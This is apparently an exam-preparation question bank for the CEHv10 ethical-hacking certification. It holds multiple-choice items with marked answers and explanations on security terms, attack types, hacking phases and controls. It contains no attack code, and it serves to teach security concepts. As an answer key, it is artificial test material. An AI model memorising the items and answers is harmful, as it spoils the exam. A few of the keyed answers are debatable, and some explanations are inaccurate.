# CEHv10 Exam prep CyberQ
# 01. Introduction to Ethical Hacking
## Information Security Overview
1. Which of the following terms refers to the existence of a weakness, design flaw, or implementation error that can lead to an unexpected event compromising the security of the system?
+ [ ] Zero-Day Attack
+ [ ] Exploit
+ [ ] Hacking
+ [x] Vulnerability
> **Explanation:**
> + Exploit refers to a breach in a system. Attackers take advantage of a vulnerability or weakness in the system to exploit it. Hacking refers to exploiting system vulnerabilities and compromising security controls to gain unauthorized or inappropriate access to the system resources. A zero-day attack is an attack that exploits computer application vulnerabilities before the software developer releases a patch for the vulnerability.

2. Which of the following terms refers to gaining access to one network and/or computer and then using the same to gain access to multiple networks and computers that contain desirable information?
+ [ ] Kill Chain
+ [x] Daisy Chaining
+ [ ] Doxing
+ [ ] Social Engineering
> **Explanation:**
> + **Doxing:** Doxing refers to gathering and publishing personally identifiable information such as an individual’s name and email address, or other sensitive information pertaining to an entire organization. People with malicious intent collect this information from publicly accessible channels such as the databases, social media and the Internet.
> + **Daisy Chaining:** It involves gaining access to one network and/or computer and then using the same information to gain access to multiple networks and computers that contain desirable information.
> + **Social Engineering:** Social engineering is an art of manipulating people to divulge sensitive information to perform some malicious action.
> + **Kill Chain:** The cyber kill chain is an efficient and effective way of illustrating how an adversary can attack the target organization. It is a part of intelligence-driven defense model for identification and prevention of malicious intrusion activities.

3. Ransomware encrypts the files and locks systems, thereby leaving the system in an unusable state. The compromised user has to pay ransom to the attacker to unlock the system and get the files decrypted. Petya delivers malicious code can that even destroy the data with no scope of recovery. What is this malicious code called?
+ [ ] Honeypot
+ [ ] Bot
+ [ ] Vulnerability
+ [x] Payload
> **Explanation:**
> + A “bot” is a software application that can be controlled remotely to execute or automate predefined tasks. A payload is the part of an exploit code that performs the intended malicious action, such as destroying data, creating backdoors, and hijacking a computer. Vulnerability is the existence of a weakness, design, or implementation error that can lead to an unexpected event compromising the security of the system. A honeypot is a computer security mechanism set to detect, deflect, or, in some manner, counteract attempts at unauthorized use of information systems.

4. Which of the following statements correctly defines a zero-day attack?  
+ [x] An attack that exploits vulnerabilities before the software developer releases a patch for the vulnerability.
+ [ ] An attack that exploits vulnerabilities after the software developer releases a patch for the vulnerability.
+ [ ] An attack that could not exploit vulnerabilities even though the software developer has not released a patch.
+ [ ] An attack that exploits an application even if there are zero vulnerabilities.
> **Explanation:**
> + In a zero-day attack, the attacker exploits vulnerabilities in a computer application before the software developer can release a patch for them.

5. Which fundamental element of information security refers to an assurance that the information is accessible only to those authorized to have access?
+ [x] Confidentiality
+ [ ] Integrity
+ [ ] Authenticity
+ [ ] Availability
> **Explanation:**
> + Integrity refers to the trustworthiness of data or resources in terms of preventing improper and unauthorized changes. Availability is an assurance that the systems responsible for delivering, storing, and processing information are accessible when required by the authorized users. Authenticity refers to the characteristic of a communication, document or any data that ensures the quality of being genuine.

6. Jonathan, a solutions architect with a start-up, was asked to redesign the company’s web infrastructure to meet the growing customer demands. He proposed the following architecture to the management:

![](./Images/0006.png)

What is Jonathan’s primary objective?
+ [x] Ensuring high availability
+ [ ] Ensuring confidentiality of the data
+ [ ] Ensuring integrity of the application servers
+ [ ] Proper user authentication
> **Explanation:**
> + High availability architecture is an approach of defining the components, modules, or implementation of services of a system that ensures optimal operational performance, even at times of high loads. High availability requires redundancy of application and database servers so that as the load increases on a resource, the user requests or processing can be handled by another.

7. Arturo is the leader of information security professionals of a small financial corporation that has a few branch offices in Africa. The company suffered an attack of USD 10 million through an interbanking system. The CSIRT explained to Arturo that the incident occurred because 6 months ago the hackers came in from the outside through a small vulnerability, then they did a lateral movement to the computer of a person with privileges in the interbanking system. Finally, the hackers got access and did the fraudulent transactions.  
What is the most accurate name for the kind of attack in this scenario?
+ [ ] Internal Attack
+ [ ] Backdoor
+ [x] APT
+ [ ] External Attack
> **Explanation:**
> + Although this can be an internal attack, the characteristic of this scenario is a definition of advanced persistent threat (APT).  
> + APT is an attack that focuses on stealing information from the victim machine without its user being aware of it. The impact of APT attacks on computer performance and Internet bandwidth is negligible as these attacks are slow in nature. APTs exploit vulnerabilities in the applications running on a computer, operating system, and embedded systems.

8. Highlander, is a medical insurance company with several regional company offices in North America. Employees, when in the office, utilize desktop computers that have Windows 10, Microsoft Office, anti-malware/virus software, and an insurance application developed by a contractor. All the software updates and patches are managed by the IT department of Highlander, Incorporated. Group policies are used to lock down the desktop computers, including the use of Applocker to restrict the installation of any third-party applications.  
There are one hundred employees who work from their home offices. Employees who work from home use their own computers, laptops, and personal smartphones. They authenticate to a cloud-based domain service, which is synchronized with the corporate internal domain service. The computers are updated and patched through the cloud-based domain service. Applocker is not used to restrict the installation of third-party applications.  
The database that hosts the information collected from the insurance application is hosted on a cloud-based file server, and their email server is hosted on Office 365. Other files created by employees get saved to a cloud-based file server, and the company uses work folders to synchronize offline copies back to their devices.  
Based on the knowledge of the network topology and trends in network security, what would be the primary target of a hacker trying to compromise Highlander?
+ [ ] Company Desktops
+ [ ] Personal Smartphones
+ [x] Cloud Based File Server
+ [ ] Personal Laptops
> **Explanation:**
> + Attackers are more interested in your cloud data than your networks.
> + The devices that the employees are using may have some vulnerabilities, but they do not contain all of the data that a hacker would be interested in. The hacker may use the vulnerable devices to eventually gain access to their primary target, which would be the cloud-based file server.

9. Highlander, Incorporated, is a medical insurance company with several regional company offices in North America. Employees, when in the office, utilize desktop computers that have Windows 10, Microsoft Office, anti-malware/virus software, and an insurance application developed by a contractor. All the software updates and patches are managed by the IT department of Highlander, Incorporated. Group policies are used to lock down the desktop computers, including the use of Applocker to restrict the installation of any third-party applications.

There are one hundred employees who work from their home offices. Employees who work from home use their own computers, laptops, and personal smartphones. They authenticate to a cloud-based domain service, which is synchronized with the corporate internal domain service. The computers are updated and patched through the cloud-based domain service. Applocker is not used to restrict the installation of third-party applications.

The laptops utilize direct access to automatically connect their machines to the Highlander, Incorporated, network when they are not in the regional offices. The laptops are set up to use IPsec when communicating with the cloud-based file server. The protocol that they have chosen is Authentication Header (AH).

The database that hosts the information collected from the insurance application is hosted on a cloud-based file server, and their email server is hosted on Office 365. Other files created by employees get saved to a cloud-based file server, and the company uses work folders to synchronize offline copies back to their devices.

Based on the knowledge of the network topology, which of the main elements of information security has Highlander, Incorporated, NOT addressed in its plans for its laptops?

+ [ ] Availability
+ [ ] Integrity
+ [x] Confidentiality
+ [ ] Authenticity
> **Explanation:**
> + Highlander, Incorporated, has not addressed confidentiality.
> + They have chosen to use Authentication Header, which will digitally sign the packets. That will allow the company to guarantee integrity, authenticity, and non-repudiation. The use of work folders will allow employees to gain access to data, even when the network connection fails. Direct access is used when connecting to the Highlander, Incorporated, hosted network, not the cloud-based file servers.

10. James has published personal information about all senior executives of Essential Securities Bank on his blog website. He has collected all this information from multiple social media websites and publicly accessible databases. What is this known as?
+ [ ] Phishing
+ [ ] Impersonation
+ [ ] Social Engineering
+ [x] Doxing
> **Explanation:**
> + **Doxing:** This refers to gathering and publishing personally identifiable information such as an individual’s name and e-mail address, or other sensitive information regarding the entire organization.
> + **Social engineering:** This is the art of convincing people to reveal sensitive information.
> + **Phishing:** This is the technique in which an attacker sends an e-mail or provides a link, falsely claiming to be from a legitimate website in an attempt to acquire a user’s personal or account information.
> + **Daisy chaining:** It involves gaining access to one network and/or computer and then using the same information to gain access to multiple networks and computers that contain desirable information.


## Information Security Threats and Attack Vectors
11. A newly discovered flaw in a software application would be considered as which kind of security vulnerability?
+ [x] Zero-day vulnerability
+ [ ] Time-to-check to time-to-use flaw
+ [ ] HTTP header injection vulnerability
+ [ ] Input validation flaw
> **Explanation:**
> + A zero-day vulnerability is a flaw that leaves software, hardware, or firmware defenseless against an attack that occurs the very same day the vulnerability is discovered.

12. An e-commerce site was put into a live environment and the programmers failed to remove the secret entry point (bits of code embedded in programs) that was used during the application development to quickly gain access at a later time, often during the testing or debugging phase.
What is this secret entry point known as?
+ [ ] Honey pot
+ [x] Trap door
+ [ ] SQL injection
+ [ ] SDLC process
> **Explanation:**
> + The software development life cycle (SDLC) is a software development process that helps developers build more secure software and address security compliance requirements while reducing development costs. A honeypot is a computer system on the Internet intended to attract and trap people who try unauthorized or illicit utilization of the host system. In an SQL injection attack, attackers insert malicious code into a standard SQL code to gain unauthorized access to a database and ultimately to other confidential information.

13. Which of the following attack vectors is a network attack in which an unauthorized person gains access to a network and stays there undetected for a long period of time? The intention of this attack is to steal data rather than to cause damage to the network or organization.
+ [ ] Mobile Threats
+ [x] Advanced Persistent Threats
+ [ ] Insider Attack
+ [ ] Botnet
> **Explanation:**
> + Advanced Persistent Threats: Advanced Persistent Threat (APT) is an attack that focuses on stealing information from the victim machine without its user being aware of it. These attacks are generally targeted at large companies and government networks. APT attacks are slow in nature, so the effect on computer performance and Internet connections is negligible. APTs exploit vulnerabilities in the applications running on a computer, operating system, and embedded systems.
> + Mobile Threats: Mobile threats falls under the category of ‘targeted attacks’ where there will not be any major goal for the attackers except to target a mobile device and gain credit card credentials or just cause chaos, get their hands on personal information for blackmail and so on.
> + Botnet: A botnet is a huge network of the compromised systems used by an intruder to perform various network attacks such as denial-of-service attacks. Bots, in a botnet, perform tasks such as uploading viruses, sending mails with botnets attached to them, stealing data, and so on.
> + Insider Attack: It is an attack performed on a corporate network or on a single computer by an entrusted person (insider) who has authorized access to the network and is aware of the network architecture.

14. Which of the following is a network based threat?
+ [ ] Buffer overflow
+ [ ] Arbitrary code execution
+ [x] Session hijacking
+ [ ] Input validation flaw
> **Explanation:**
> There are three types of information security threats: Network Threats, Host Threats, and Application Threats. 
> + **Network Threats:** A network is the collection of computers and other hardware connected by communication channels to share resources and information. As the information travels from one system to the other through the communication channel, a malicious person might break into the communication channel and steal the information traveling over the network. Listed below are some of the network threats:
> 	+ Information gathering
> 	+ Sniffing and eavesdropping
> 	+ Spoofing
> 	+ Session hijacking
> 	+ Man-in-the-Middle attack
> + **Host Threats:** Host threats target a particular system on which valuable information resides. Attackers try to breach the security of the information system resource. Listed below are some of the host threats:
> 	+ Malware attacks
> 	+ Footprinting
> 	+ Denial-of-Service attacks
> 	+ Arbitrary code execution
> 	+ Unauthorized access
> + **Application Threats:** Applications can be vulnerable if proper security measures are not taken while developing, deploying, and maintaining them. Attackers exploit the vulnerabilities present in an application to steal or destroy data. Listed below are some of the application threats:
> 	+ Improper data/input validation
> 	+ Authentication and authorization attacks
> 	+ Security misconfiguration
> 	+ Improper error handling and exception management
> 	+ Information disclosure
> 	+ Hidden-field manipulation
> 	+ Broken session management
> 	+ Buffer overflow issues

15. Ron, a customer support intern, exploited default configurations and settings of the off-the-shelf libraries and code used in the company’s CRM platform. How will you categorize this attack?
+ [ ] Operating System attack
+ [ ] Application-level attack
+ [x] Shrink-wrap code attack
+ [ ] Mis-configuration attack
> **Explanation:**
> Many approaches exist for an attacker to gain access to the system. One common requirement for all such approaches is that the attacker finds and exploits a system’s weakness or vulnerability.
> + **Operating System Attacks:** Attackers search for vulnerabilities in an operating system’s design, installation or configuration and exploit them to gain access to a system.
> + **Misconfiguration attack:** Security misconfiguration or poorly configured security controls might allow attackers to gain unauthorized access to the system, compromise files, or perform other unintended actions. Misconfiguration vulnerabilities affect web servers, application platforms, databases, networks, or frameworks that may result in illegal access or possible system takeover.
> + **Application-level attack:** Attackers exploit the vulnerabilities in applications running on organizations’ information system to gain unauthorized access and steal or manipulate data.
> + **Shrink-wrap code attack:** Software developers often use free libraries and code licensed from other sources in their programs to reduce development time and cost. This means that large portions of many pieces of software will be the same, and if an attacker discovers vulnerabilities in that code, many pieces of software are at risk. Attackers exploit default configuration and settings of the off-the-shelf libraries and code. The problem is that software developers leave the libraries and code unchanged.

16. Highlander, Incorporated, is a medical insurance company with several regional company offices in North America. Employees, when in the office, utilize desktop computers that have Windows 10, Microsoft Office, anti-malware/virus software, and an insurance application developed by a contractor. All of the software updates and patches are managed by the IT department of Highlander, Incorporated. Group policies are used to lock down the desktop computers, including the use of Applocker to restrict the installation of any third-party applications. There are one hundred employees who work from their home offices. Employees who work from home use their own computers, laptops, and personal smartphones. They authenticate to a cloud-based domain service, which is synchronized with the corporate internal domain service. The computers are updated and patched through the cloud-based domain service. Applocker is not used to restrict the installation of third-party applications. The database that hosts the information collected from the insurance application is hosted on a cloud-based file server, and their email server is hosted on Office 365. Other files created by employees get saved to a cloud-based file server, and the company uses work folders to synchronize offline copies back to their devices. A competitor learns that employees use their own personal smartphones to communicate with other employees of Highlander, Incorporated. Which information security attack vector should the competitor use to gather information over a long period of time from the phones, without the victim being aware that he or she has been compromised?
+ [ ] Botnet
+ [x] Advanced Persistent Threat
+ [ ] Viruses and Worms
+ [ ] Mobile Threats
> **Explanation:**
> + The competitor should utilize advanced persistent threats. It is an attack that will focus on stealing information without the user being aware of it. 
> + Viruses and worms normally affect the productivity of the machine and will be detected by anti-malware/virus programs or the end user when the computer does not respond as expected. Mobile threats do target mobile devices, but they vary and do not guarantee avoiding detection. A botnet is a network of devices used to perform network attacks.

17. Which of the following malware types restricts access to the computer system’s files and folders, and demands a payment to the malware creator(s) in order to remove the restrictions?  
+ [ ] Spyware
+ [x] Ransomeware
+ [ ] Adware
+ [ ] Trojan Horse
> **Explanation:**
> + **Ransomware:** Ransomware is a type of a malware, which restricts access to the computer system’s files and folders and demands an online ransom payment to the malware creator(s) in order to remove the restrictions. It is generally spread via malicious attachments to email messages, infected software applications, infected disks or compromised websites.
> + **Adware:** Adware (short for advertising-supported software) is a type of malware that automatically delivers unwanted advertisements in the user interface. Adware produces advertisements in the form of a pop-up or sometimes in an unclosable window.
> + **Spyware:** Spyware is a stealthy program that records user's interaction with the computer and Internet without the user's knowledge and sends them to the remote attackers. Spyware hides its process, files, and other objects in order to avoid detection and removal.
> + **Trojan Horse:** It is a program in which the malicious or harmful code is contained inside apparently harmless programming or data in such a way that it can get control and cause damage, such as ruining the file allocation table on your hard disk.

18. Which of the following techniques is used to distribute malicious links via some communication channel such as mails to obtain private information from the victims?
+ [x] Phishing
+ [ ] Vishing
+ [ ] Dumpster diving
+ [ ] Piggybacking
> **Explanation:**
> + **Dumpster Diving:** Dumpster diving is the process of retrieving sensitive personal or organizational information by searching through trash bins.
> + **Phishing:** Phishing is a technique in which an attacker sends an email or provides a link falsely claiming to be from a legitimate site in an attempt to acquire a user’s personal or account information. The attacker registers a fake domain name, builds a lookalike website, and then mails the fake website’s link to several users. When a user clicks on the email link, it redirects him/her to the fake webpage, where he/she is lured to share sensitive details such as address and credit card information without knowing that it is a phishing site.
> + **Piggybacking:** Piggybacking usually implies entry into the building or security area with the consent of the authorized person. For example, attackers would request an authorized person to unlock a security door, saying that they have forgotten their ID badge. In the interest of common courtesy, the authorized person will allow the attacker to pass through the door.
> + **Vishing:** Vishing (voice or VoIP phishing) is an impersonation technique in which attacker uses Voice over IP (VoIP) technology to trick individuals into revealing their critical financial and personal information and uses the information for his/her financial gain.

19. Which of the following can be categorized as a host-based threat?
+ [x] Privilege escalation
+ [ ] IDS bypass
+ [ ] Distributed Denial-of Service
+ [ ] Man-in-the-Middle attack
> **Explanation:**
> There are three types of information security threats: Network Threats, Host Threats, and Application Threats.
>	+ **Network Threats:** A network is the collection of computers and other hardware connected by communication channels to share resources and information. As the information travels from one system to the other through the communication channel, a malicious person might break into the communication channel and steal the information traveling over the network.
> Listed below are some of the network threats:
>		+ Information gathering
>		+ Sniffing and eavesdropping
>		+ Spoofing
>		+ Session hijacking
>		+ Man-in-the-Middle attack
> + **Host Threats:** Host threats target a particular system on which valuable information resides. Attackers try to breach the security of the information system resource.
> Listed below are some of the host threats:
> 	+ Malware attacks
> 	+ Footprinting
> 	+ Denial-of-Service attacks
> 	+ Arbitrary code execution
> 	+ Unauthorized access
> 	+ Privilege escalation
> 	+ Backdoor attacks
> + **Application Threats:** Applications can be vulnerable if proper security measures are not taken while developing, deploying, and maintaining them. Attackers exploit the vulnerabilities present in an application to steal or destroy data.
> Listed below are some of the application threats:
> 	+ Improper data/input validation
> 	+ Authentication and authorization attacks
> 	+ Security misconfiguration
> 	+ Improper error handling and exception management
> 	+ Information disclosure
> 	+ Hidden-field manipulation
> 	+ Broken session management
> 	+ Buffer overflow issues

20. Which of the following category of information warfare is a sensor-based technology that directly corrupts technological systems?
+ [ ] Electronic warfare
+ [ ] Economic warfare
+ [x] Intelligence-based warfare
+ [ ] Command and control warfare (C2 warfare)
> **Explanation:**
> + **Electronic warfare:** Electronic warfare uses radio electronic and cryptographic techniques to degrade communication. Radio electronic techniques attack the physical means of sending information, whereas cryptographic techniques use bits and bytes to disrupt the means of sending information.
> + **Intelligence-based warfare:** Intelligence-based warfare is a sensor-based technology that directly corrupts technological systems. Intelligence-based warfare is a warfare that consists of the design, protection, and denial of systems that seek sufficient knowledge to dominate the battlespace.
> + **Command and control warfare (C2 warfare):** In the computer security industry, C2 warfare refers to the impact an attacker possesses over a compromised system or network that they control.
> + **Economic warfare:** Economic information warfare can affect the economy of a business or nation by blocking the flow of information. This could be especially devastating to organizations that do a lot of business in the digital world.


## Hacking Concepts, Types, and Phases
21. Yancey is a network security administrator for a large electric company. This company provides power for over 100,000 people in Las Vegas. Yancey has worked for his company for more than 15 years and has become very successful. One day, Yancey comes into work and finds out that the company will be downsizing and he will be out of a job in two weeks. Yancey is very angry and decides to place logic bombs, viruses, Trojans, and backdoors all over the network to take down the company once he has left. Yancey does not care if his actions land him in jail for 30 or more years; he just wants the company to pay for what they are doing to him. What would Yancey be considered?
+ [x] Yancey would be considered a suicide hacker.
+ [ ] Because Yancey works for the company currently, he would be a white hat.
+ [ ] Yancey is a hacktivist hacker since he is standing up to a company that is downsizing.
+ [ ] Since he does not care about going to jail, he would be considered a black hat.
> **Explanation:**
> + Black hats are individuals with extraordinary computing skills, resorting to malicious or destructive activities and are also known as crackers.
> + Individuals professing to have hacker skills and using them for defensive purposes and are security analysts are known as white hats.
> + Hacktivists are individuals who promote a political agenda by hacking, especially by defacing or disabling websites.
> + Suicide hackers are individuals who aim to bring down the critical infrastructure for a “cause” and are not worried about facing jail terms or any other kind of punishment.

22. What is the correct order of steps in the system hacking cycle?  
+ [x] Gaining Access -> Escalating Privileges -> Executing Applications -> Hiding Files -> Covering Tracks
+ [ ] Covering Tracks -> Hiding Files -> Escalating -> Privileges -> Executing Applications -> Gaining Access
+ [ ] Escalating Privileges -> Gaining Access -> Executing Applications -> Covering Tracks -> Hiding Files
+ [ ] Executing Applications -> Gaining Access -> Covering Tracks -> Escalating Privileges -> Hiding Files
> **Explanation:**
> + In a system hacking cycle, the attacker should first attempt to exploit and gain access to the target system. Then he has to escalate his privileges to access the root directory of the target system. Once the attacker achieves the elevated privileges, he can perform any malicious activity like executing malicious applications on the target system and data theft. Next, the malicious applications have to be hidden somewhere in the target machine so that the legitimate user is not able to identify and delete them. After completing all these stages, now the attacker has to cover his tracks to avoid detection.

23. Which of the following terms refers to unskilled hackers who compromise systems by running scripts, tools, and software developed by real hackers? They usually focus on the quantity of attacks rather than the quality of the attacks that they initiate.
+ [ ] Hacktivist
+ [ ] Suicide Hackers
+ [ ] Gray Hats
+ [x] Script Kiddies
> **Explanation:**
> + **Hacktivist:** Hacktivists are individuals who promote a political agenda by hacking, especially by defacing or disabling websites.
> + **Script Kiddies:** Script kiddies are unskilled hackers who compromise systems by running scripts, tools, and software developed by real hackers. They usually focus on the quantity of attacks rather than the quality of the attacks that they initiate.
> + **Gray Hats:** Gray hats are the individuals who work both offensively and defensively at various times. Gray hats fall between white and black hats. Gray hats might help hackers in finding various vulnerabilities of a system or network and at the same time help vendors to improve products (software or hardware) by checking limitations and making them more secure.
> + **Suicide Hackers:** Suicide hackers are individuals who aim to bring down critical infrastructure for a “cause” and are not worried about facing jail terms or any other kind of punishment. Suicide hackers are similar to suicide bombers, who sacrifice their life for an attack and are thus not concerned with the consequences of their actions.

24. What is the objective of a reconnaissance phase in a hacking life-cycle?
+ [x] Gathering as much information as possible about the target.
+ [ ] Gaining access to the target system with admin/root level privileges.
+ [ ] Gaining access to the target system and network.
+ [ ] Identifying specific vulnerabilities in the target network.
> **Explanation:**
> + Reconnaissance refers to the preparatory phase in which an attacker gathers as much information as possible about the target prior to launching the attack. In this phase, the attacker draws on competitive intelligence to learn more about the target. This phase allows attackers to plan the attack.
> + Identification of specific vulnerabilities in the target network is done in the scanning and enumeration phase, whereas attackers gain access to the target system or network in the gaining access phase of a hacking life cycle.

25. Which of the following is an active reconnaissance technique?
+ [ ] Collecting contact information from yellow pages
+ [ ] Collecting information about a target from search engines
+ [ ] Performing dumpster diving
+ [x] Scanning a system by using tools to detect open ports
> **Explanation:**
> + When an attacker is using passive reconnaissance techniques, she/he does not interact with the system directly. Instead, the attacker relies on publicly available information, social engineering, and even dumpster diving as a means of gathering information. Active reconnaissance techniques, on the other hand, involve direct interactions with the target system by using tools to detect open ports, accessible hosts, router locations, network mapping, details of operating systems, and applications. Attackers use active reconnaissance when there is a low probability of detection of these activities.

26. Anonymous, a known hacker group, claim to have taken down 20,000 Twitter accounts linked to Islamic State in response to the Paris attacks that left 130 people dead. How can you categorize this attack by Anonymous?
+ [ ] Spoofing
+ [ ] Cracking
+ [ ] Social engineering
+ [x] Hacktivism
> **Explanation:**
> + Hacktivism is when hackers break into government or corporate computer systems as an act of protest. In the above scenario, the hacker group breaks into the Islamic State corporate computer system in response to the Paris attack. Hence, Hacktivism is the correct option.

27. Highlander, Incorporated, is a medical insurance company with several regional company offices in North America. Employees, when in the office, utilize desktop computers that have Windows 10, Microsoft Office, anti-malware/virus software, and an insurance application developed by a contractor. All of the software updates and patches are managed by the IT department of Highlander, Incorporated. Group policies are used to lock down the desktop computers, including the use of Applocker to restrict the installation of any third-party applications.
There are one hundred employees who work from their home offices. Employees who work from home use their own computers, laptops, and personal smartphones. They authenticate to a cloud-based domain service, which is synchronized with the corporate internal domain service. The computers are updated and patched through the cloud-based domain service. Applocker is not used to restrict the installation of third-party applications.
The protocol that they have chosen is Authentication Header (AH).
The database that hosts the information collected from the insurance application is hosted on a cloud-based file server, and their email server is hosted on Office 365. Other files created by employees get saved to a cloud-based file server and the company uses work folders to synchronize offline copies back to their devices.
A competitor has finished the reconnaissance and scanning phases of their attack. They are going to try to gain access to the Highlander, Incorporated, laptops. Which would be the most likely level to gain access?
+ [ ] Network Level
+ [ ] Hardware Level
+ [ ] Operating System
+ [x] Application Level
> **Explanation:**
> + The most likely level to gain access is the application level. The application is designed by a third party.
> The operating system is regularly patched and the traffic is protected by AH and a VPN. There is no such thing as a hardware level for this concept.

28. Individuals who promote security awareness or a political agenda by performing hacking are known as:
+ [ ] Script kiddies
+ [x] Hacktivist
+ [ ] Suicide hackers
+ [ ] Cyber terrorists
> **Explanation:**
> + **Hacktivists:** Hackers who break into government or corporate computers as an act of protest or to increase awareness.  
> + **Cyber terrorists:** Individuals motivated by religious or political beliefs to create fear of large-scale disruption.  
> + **Script kiddies:** Unskilled hackers who compromise systems by running scripts, tools, and software developed by other hackers.  
> + **Suicide hackers:** Hackers who aim to bring down critical infrastructure and do not worry about being caught and facing jail terms or any other kind of punishments.

29. In which of the following hacking phases does an attacker try to detect listening ports to find information about the nature of services running on the target machine?
+ [x] Scanning
+ [ ] Clearing Tracks
+ [ ] Gaining access
+ [ ] Maintaining access
> **Explanation:**
> + Attackers use dialers, port scanners, network mappers, ping tools, vulnerability scanners, and so on during scanning to extract information such as live machines, open ports, port status, OS details, device type, system uptime, and so on.
> + In the gaining access phase, attackers use vulnerabilities identified during the reconnaissance and scanning phase to gain access to the target system and network. Gaining access refers to the point where the attacker obtains access to the operating system or applications on the computer or network.
> + Maintaining access refers to the phase when the attacker tries to retain his or her ownership of the system. Once an attacker gains access to the target system with admin/root level privileges (thus owning the system), he or she is able to use both, the system and its resources at will, and can either use the system as a launch pad to scan and exploit other systems, or to keep a low profile and continue exploiting the system.
> + Clearing tracks refers to the activities carried out by an attacker to hide malicious acts. The attacker’s intentions include continued access to the victim’s system, remaining unnoticed and uncaught, deleting evidence that might lead to his/her prosecution.

30. In which of the following hacking phases does an attacker use steganography and tunneling techniques to hide communication with the target for continuing access to the victim’s system and remain unnoticed and uncaught?
+ [x] Clearing Track
+ [ ] Reconnaissance
+ [ ] Gaining Access
+ [ ] Scanning
> **Explanation:**
> + **Reconnaissance**: Reconnaissance refers to the preparatory phase in which an attacker gathers as much information as possible about the target prior to launching the attack. In this phase, the attacker draws on competitive intelligence to learn more about the target.
> + **Scanning**: Scanning is the phase immediately preceding the attack. Here, the attacker uses the details gathered during reconnaissance to scan the network for specific information. Scanning can include use of dialers, port scanners, network mappers, ping tools, vulnerability scanners, and so on. Attackers extract information such as live machines, port, port status, OS details, device type, and system uptime to launch the attack.
> + **Gaining access:** Gaining access refers to the point where the attacker obtains access to the operating system or applications on the computer or network.
> + **Clearing tracks:** Clearing tracks refers to the activities carried out by an attacker to hide malicious acts. An attacker’s intentions include continued access to the victim’s system, remaining unnoticed and uncaught, and deleting evidence that might lead to his or her prosecution.
> + Steganography is the process of hiding data in other data, for instance image and sound files. Tunneling takes advantage of the transmission protocol by carrying one protocol over another. Attackers can use steganography and tunneling to launch new attacks against other systems or as a means of reaching another system on the network undetected.


## Information Security Controls
31. Which of the following is a preventive control?
+ [ ] Continuity of operations plan
+ [x] Smart card authentication.
+ [ ] Audit trail.
+ [ ] Performance review.
> **Explanation:**
> Security controls are safeguards or countermeasures to avoid, detect, respond, or minimize  security  risks to physical property, information systems, or other assets.
> Security controls are classified as follows:
> + ? Preventive Controls - Prevent an incident from occurring. E.g., Security guard, smart card authentication, etc.
> + ? Detective Controls - Identify and characterize an incident in progress. E.g., Audit trail, system monitoring, etc.
> + ? Corrective Controls - Limit the extent of any damage caused by the incident. E.g., Security policy, continuity of operations plan, etc.

32. Which of the following is a detective control?
+ [ ] Smart card authentication.
+ [ ] Continuity of operations plan.
+ [x] Audit trail.
+ [ ] Security policy.
> **Explanation:**
> Security controls are safeguards or countermeasures to avoid, detect, respond, or minimize  security  risks to physical property, information systems, or other assets.
> Security controls are classified as follows:
> + **Preventive Controls** - Prevent an incident from occurring. E.g., Security guard, smart card authentication, etc.
> + **Detective Controls** - Identify and characterize an incident in progress. E.g., Audit trail, system monitoring, etc.
> + **Corrective Controls** - Limit the extent of any damage caused by the incident. E.g., Security policy, continuity of operations plan, etc.

33. The implementation of a BYOD policy that prohibits employees from bringing personal computing devices into a facility falls under what type of security controls?
+ [ ] Physical
+ [ ] Technical
+ [x] Procedural
+ [ ] Logical
> **Explanation:**
> + Physical controls refer to the use of fences, doors, locks, and fire extinguishers to secure a facility.
> + Procedural or administrative controls refer to the use of policies, procedures, or guidelines to mitigate risks.
> + Technical controls refer to the use of technical safeguards, for example, user authentication (login) and logical access controls, antivirus software, firewalls, and so on to mitigate risks.
> + According to ISO 27002, logical controls are the same as the technical controls and embrace data, files, and programs.

34. When comparing the testing methodologies of Open Web Application Security Project (OWASP) and Open Source Security Testing Methodology Manual (OSSTMM) the main difference is.
+ [ ] OSSTMM is gray box testing and OWASP is black box testing.
+ [ ] OWASP is for web applications and OSSTMM does not include web applications.
+ [x] OSSTMM addresses controls and OWASP does not.
+ [ ] OWASP addresses controls and OSSTMM does not.
> **Explanation:**
> + **OWASP** is the Open Web Application Security Project, which is an open-source application security project that assists the organizations to purchase, develop and maintain software tools, software applications, and knowledge-based documentation for Web application security. It provides a set of tools and a knowledge base, which help in protecting Web applications and services. It is beneficial for system architects, developers, vendors, consumers, and security professionals who might work on designing, developing, deploying, and testing the security of Web applications and Web services. 
> + **OSSTMM** is the Open-Source Security Testing Methodology Manual, compiled by Pete Herzog. It is a peer-reviewed methodology for performing high-quality security tests such as methodology tests: data controls, fraud and social engineering control levels, computer networks, wireless devices, mobile devices, physical security access controls, and various security processes. OSSTMM is a standard set of penetration tests to achieve security metrics. It is considered to be a de facto standard for the highest level of testing, and it ensures high consistency and remarkable accuracy.

35. Which type of access control is used on a router or firewall to limit network activity?
+ [ ] Role-based.
+ [ ] Mandatory.
+ [ ] Discretionary.
+ [x] Rule-based.
> **Explanation:**
> + Active security policies that enforce rules on the traffic in transit (traffic that can pass through the firewall and the action to be taken against it).

36. When creating a security program, which approach would be used if senior management is supporting and enforcing the security policy?
+ [ ] A senior creation approach.
+ [ ] An IT assurance approach.
+ [x] A top-down approach.
+ [ ] A bottom-up approach.
> **Explanation:**
> + A top-down approach means that the senior level executives have endorsed the security policy. In a top-down approach initiation, support, and direction come from the top management, work through the middle management, and then reach staff members.

37. An IT security engineer notices that the company’s web server is currently being hacked. What should the engineer do next?
+ [ ] Perform a system restart on the company’s web server.
+ [ ] Record as much information as possible from the attack.
+ [x] Unplug the network connection on the company’s web server.
+ [ ] Determine the origin of the attack and launch a counterattack.
> **Explanation:**
> + In the above scenario, the company’s web server is hacked. As an IT security engineer, your first task is to unplug the network connection (cable) on the company’s web server from the router and modem in order to prevent further attacks.

38. Which of the following is a primary service of the U.S. CSIRT?
+ [ ] CSIRT provides computer security surveillance service to supply a government with important intelligence information on individuals traveling abroad.
+ [x] CSIRT provides an incident response service to enable a reliable and trusted single point of contact for reporting computer security incidents worldwide.
+ [ ] CSIRT provides vulnerability assessment service to assist law enforcement agencies with profiling an individual’s property or a company’s asset.
+ [ ] CSIRT provides penetration testing service to support exception reporting on incidents worldwide by individuals and multinational corporations.
> **Explanation:**
> + CSIRT provides 24x7 CSIRT Services to any user, company, government agency, or organization. It provides a reliable and trusted single point of contact for reporting computer security incidents worldwide. CSIRT provides the means for reporting incidents and for disseminating important incident-related information.

39. Which of the following ensures that updates to policies, procedures, and configurations are made in a controlled and documented manner?
+ [ ] Regulatory compliance
+ [x] Change management
+ [ ] Peer review
+ [ ] Penetration testing
> **Explanation:**
> + Change management systems and procedures are implemented to help companies ensure that policies and approvals are met before a change to the system is implemented.
